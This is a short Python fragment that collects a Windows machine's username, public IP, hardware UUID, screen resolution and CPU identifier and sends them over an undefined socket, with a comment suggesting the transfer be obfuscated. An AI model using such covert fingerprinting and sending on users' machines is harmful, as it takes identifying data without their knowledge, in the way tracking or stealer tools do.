import requests
from wmi import WMI
import os
import getpass
from win32api import GetSystemMetrics
import uuid

user = getpass.getuser()
ip = requests.get("https://api.ipify.org/").text  # needed to check the real ip and ip in the code
hwid = WMI().Win32_ComputerSystemProduct()[0].UUID  # example: B41385AE-0723-00B5-AD06-D45D64FDBB0F
monitor = str([GetSystemMetrics(0), GetSystemMetrics(1)])  # [1920, 1080]
processor = os.environ['PROCESSOR_IDENTIFIER']  # AMD64 Family 23 Model 8 Stepping 2, AuthenticAMD
info = str([user, ip, hwid, monitor, processor])

#
# here you can make an obfuscation method to transfer encrypted data
#

client.send(info.encode("utf-8"))